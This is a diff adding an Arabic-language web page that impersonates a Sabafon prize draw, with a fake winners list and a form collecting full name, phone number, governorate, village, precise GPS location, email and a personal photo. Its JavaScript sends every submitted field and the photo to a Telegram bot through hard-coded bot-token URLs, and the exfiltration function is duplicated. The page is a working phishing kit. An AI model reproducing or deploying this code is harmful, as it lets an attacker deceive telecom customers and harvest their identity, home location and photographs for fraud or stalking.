@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>التحقق من الربح في جوائز Sabafon</title>
+  <link rel="stylesheet" href="evil-style.css">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      border: 10px solid #003366;
+      box-sizing: border-box;
+      background-color: #003366;
+      color: #000;
+    }
+    main {
+      border: 5px solid #003366;
+      padding: 10px;
+      box-sizing: border-box;
+      min-height: 100vh;
+    }
+    header, footer {
+      background-color: #003366;
+      padding: 10px;
+      border: 10px solid #003366;
+      box-sizing: border-box;
+    }
+    h1, h2, h3, p, li {
+      margin: 0;
+    }
+    section {
+      margin-bottom: 20px;
+      padding-bottom: 20px;
+      border-bottom: 2px solid #003366;
+    }
+    img {
+      width: 100%;
+      height: auto;
+      border: 5px solid #003366;
+      box-sizing: border-box;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    .hidden {
+      display: none;
+    }
+    #wait-bar {
+      display: none;
+      background-color: #003366;
+      height: 30px;
+      line-height: 30px;
+      text-align: center;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <img src="sabafon.jpg" alt="Image description">
+  <header>
+    <h1 style="color: #ff0000;">🎉مع سبافون صارت الفرصة فرصتين ذهب وسيارتين 🎉</h1>
+  </header>
+  <main>
+    <img src="sabafon-design-sizes-layout-1.png" alt="Image description">
+    <section id="categories">
+      <h2 style="color: #00ff00;">الجوائز</h2>
+      <ul>
+        <li style="color: #0000ff;"><a href="evil-link1">سيارة تويتا كورس 2023</a></li>
+        <li style="color: #0000ff;"><a href="evil-link2">سبكتين من الذهب </a></li>
+      </ul>
+    </section>
+    <section id="winners">
+      <h2 style="color: #ff00ff;">اسماءالفائزين بشهر 11</h2>
+      <ul>
+        <li style="border-bottom: 2px solid #003366; padding-bottom: 5px;">
+          <h3 style="color: #ffffff;">فيصل حسن بكيل فرحة</h3>
+        </li>
+        <li>
+          <h3 style="color: #ffffff;">محمد احمد محمد الفلاحي</h3>
+        </li>
+        <li>
+          <h3 style="color: #ffffff;">فارس فؤاد عبدالله محمد </h3>
+        </li>
+        <li>
+          <h3 style="color: #ffffff;">عبد الله حسين مشعل الغريبي </h3>
+        <li>  <h3 style="color: #ffffff;">علي عبدالله فرحان إسماعيل</h3>
+      </ul>
+    </section>
+    <section id="entry" style="background-color: #4682b4; padding: 20px; border-radius: 10px;">
+     <button onclick="showWaitBar()" style="background-color: #003366; color: #fff; border: none; padding: 10px; border-radius: 5px; cursor: pointer; display: flex; justify-content: center; align-items: center; width: 50%; margin: 0 auto;">
+  المشاركة في السحب
+</button>
+      <div id="wait-bar" class="hidden" style="color: white;">قم بادخال المعلومات الاتية</div>
+      <form id="entry-form" action="javascript:sendToTelegram()" class="hidden">
+        <div class="input-group" style="display: flex; flex-direction: column; align-items: center;">
+          <label for="name" style="color: #000; margin-bottom: 5px;">الاسم الرباعي</label>
+          <input type="text" name="name" placeholder="اكتب اسمك الرباعي" style="background-color: #fff; padding: 8px; border-radius: 5px;">
+        </div>
+        <div class="input-group" style="display: flex; flex-direction: column; align-items: center;">
+          <label for="phone" style="color: #000; margin-bottom: 5px;">رقم الهاتف</label>
+          <input type="text" name="phone" placeholder="رقم الهاتف الذي تستخدمه" style="background-color: #fff; padding: 8px; border-radius: 5px;">
+        </div>
+        <div class="input-group" style="display: flex; flex-direction: column; align-items: center;">
+          <label for="city" style="color: #000; margin-bottom: 5px;">المحافضة</label>
+          <input type="text" name="city" placeholder="المحافضة التي تعيش فيها " style="background-color: #fff; padding:8px; border-radius: 5px;">
+            </div>
+            <div class="input-group" style="display: flex; flex-direction: column; align-items: center;">
+              <label for="street" style="color: #000; margin-bottom: 5px;">الحارة او القرية</label>
+              <input type="text" name="street" placeholder="اسم قريتك او حارتك التي تعيش فيها " style="background-color: #fff; padding: 8px; border-radius: 5px;">
+            </div>
+<div class="input-group" style="display: flex; flex-direction: column; align-items: center;">
+              <label for="location" style="color: #000; margin-bottom: 5px;">الموقع</label>
+              <button type="button" onclick="requestLocation()" style="background-color: #191970; color: #fff; border: none; padding: 10px; border-radius: 5px; cursor: pointer;">
+                الحصول على الموقع الجغرافي 
+              </button>
+              <input type="hidden" name="latitude" id="latitude">
+              <input type="hidden" name="longitude" id="longitude">
+            </div>
+            <div class="input-group" style="display: flex; flex-direction: column; align-items: center;">
+<label for="email" style="color: #000; margin-bottom: 5px;">الإيميل</label>
+              <input type="email" name="email" placeholder="example@example.com (optional)" style="background-color: #fff; padding: 8px; border-radius: 5px; margin-bottom: 10px;">
+            
+              <label for="photo" style="color: #000; margin-bottom: 5px;">صورة شخصية</label>
+              <input type="file" name="photo" accept="image/*" style="padding: 8px; border-radius: 5px;">
+            </div>
+            <div id="loading-message" style="display: none; color: #191970; font-weight: bold; margin-top: 10px;">
+              Loading data...
+            </div>
+            
+            <div style="display: flex; justify-content: center; align-items: center; margin-top: 10px;">
+              <input type="submit" value="رفع البيانات" onclick="showLoadingMessage()" style="background-color: #191970; color: #fff; border: none; padding: 10px; border-radius: 5px; cursor: pointer;">
+            </div>
+            
+           
+          </form>
+          </section>
+          </main>
+          <footer style="background-color: #191970; color: #fff; padding: 10px; text-align: center;">
+          &copy; 2024  Sabafon جميع الحقوق محفوضة 
+          </footer>
+          
+           <script>
+           
+                        function showLoadingMessage() {
+                          // Show loading message
+                          document.getElementById("loading-message").style.display = "block";
+                      
+                          // You can add further actions here, such as submitting the form
+                          // For demonstration purposes, a timeout is added to hide the message after 3 seconds
+                          setTimeout(function() {
+                            document.getElementById("loading-message").style.display = "none";
+                          }, 3000);
+                        }
+                      
+            function requestLocation() {
+              if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                  function (position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+          
+                    // Update hidden fields with latitude and longitude
+                    document.getElementById("latitude").value = latitude;
+                    document.getElementById("longitude").value = longitude;
+                    
+                    // Optionally, you can display the coordinates to the user
+                    alert(`Location received!\nLatitude: ${latitude}\nLongitude: ${longitude}`);
+                  },
+                  function (error) {
+                    console.error(error.message);
+                    alert("Error getting location. Please try again or enter manually.");
+                  }
+                );
+              } else {
+                alert("Geolocation is not supported by your browser.");
+              }
+            }
+          
+            // Rest of the existing code...
+          
+            function sendToTelegram() {
+              // Extracting form data
+              const formData = new FormData(document.getElementById("entry-form"));
+          
+              // Constructing a formatted message
+              let message = "New Entry:\n";
+          
+              formData.forEach((value, key) => {
+                if (key !== 'photo') {
+                  message += `${capitalizeFirstLetter(key)}: ${value}\n`;
+                }
+              });
+          
+              // Include latitude and longitude in the message
+              const latitude = formData.get('latitude');
+              const longitude = formData.get('longitude');
+              if (latitude && longitude) {
+                message += `Location: https://www.google.com/maps?q=${latitude},${longitude}\n`;
+              }
+          
+              // Sending the formatted message to your Telegram bot
+              fetch(`https://api.telegram.org/bot6916811138:AAGfbrZ_RE92EIUODZAcrTAHcovopitq8ZQ/sendMessage?chat_id=5926222376&text=${encodeURIComponent(message)}`);
+          
+              // Sending the photo file to your Telegram bot
+              const photoInput = document.querySelector('input[name="photo"]');
+              const photoFile = photoInput.files[0];
+          
+              if (photoFile) {
+                const photoFormData = new FormData();
+                photoFormData.append('photo', photoFile);
+          
+                fetch(`https://api.telegram.org/bot6916811138:AAGfbrZ_RE92EIUODZAcrTAHcovopitq8ZQ/sendPhoto?chat_id=5926222376`, {
+                  method: 'POST',
+                  body: photoFormData,
+                });
+              }
+            }
+          
+            // Function to capitalize the first letter of a string
+            function capitalizeFirstLetter(string) {
+              return string.charAt(0).toUpperCase() + string.slice(1);
+            }
+          
+       function showWaitBar() {
+            document.getElementById("wait-bar").style.display = "block";
+            setTimeout(function() {
+              document.getElementById("entry-form").style.display = "block";
+            }, 3000);
+          }
+          
+          function sendToTelegram() {
+            // Extracting form data
+            const formData = new FormData(document.getElementById("entry-form"));
+          
+            // Sending text data to your Telegram bot
+            let textData = {};
+            formData.forEach((value, key) => {
+              if (key !== 'photo') {
+                textData[key] = value;
+              }
+            });
+          
+            fetch(`https://api.telegram.org/bot6916811138:AAGfbrZ_RE92EIUODZAcrTAHcovopitq8ZQ/sendMessage?chat_id=5926222376&text=${JSON.stringify(textData)}`);
+          
+            // Sending photo file to your Telegram bot
+            const photoInput = document.querySelector('input[name="photo"]');
+            const photoFile = photoInput.files[0];
+          
+            if (photoFile) {
+              const photoFormData = new FormData();
+              photoFormData.append('photo', photoFile);
+          
+              fetch(`https://api.telegram.org/bot6916811138:AAGfbrZ_RE92EIUODZAcrTAHcovopitq8ZQ/sendPhoto?chat_id=5926222376`, {
+                method: 'POST',
+                body: photoFormData,
+              });
+            }
+          }
+          </script>
+          </body>
+</html>
